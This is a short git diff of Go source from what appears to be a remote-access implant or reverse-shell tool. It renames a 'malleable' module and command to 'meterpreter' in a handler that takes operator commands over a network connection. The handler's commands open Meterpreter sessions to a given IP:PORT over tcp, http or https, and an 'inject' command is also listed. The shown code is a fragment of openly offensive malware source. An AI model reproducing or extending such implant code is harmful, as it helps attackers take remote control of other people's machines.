@@ -10,7 +10,7 @@ import (
 	"os"
 	"strings"
 
-	"github.com/m1ddl3w4r3/Gat/malleable"
+	"github.com/m1ddl3w4r3/Gat/meterpreter"
 	"github.com/m1ddl3w4r3/Gat/shell"
 )
 
@@ -39,16 +39,16 @@ func interactiveShell(conn net.Conn) {
 		if len(command) > 1 {
 			argv := strings.Split(command, " ")
 			switch argv[0] {
-			case "malleable":
+			case "meterpreter":
 				if len(argv) > 2 {
 					transport := argv[1]
 					address := argv[2]
-					ok, err := malleable.Malleable(transport, address)
+					ok, err := meterpreter.Meterpreter(transport, address)
 					if !ok {
 						conn.Write([]byte(err.Error() + "\n"))
 					}
 				} else {
-					conn.Write([]byte("Usage: malleable [tcp|http|https] IP:PORT\n"))
+					conn.Write([]byte("Usage: meterpreter [tcp|http|https] IP:PORT\n"))
 				}
 			case "inject":
 				if len(argv) > 1 {
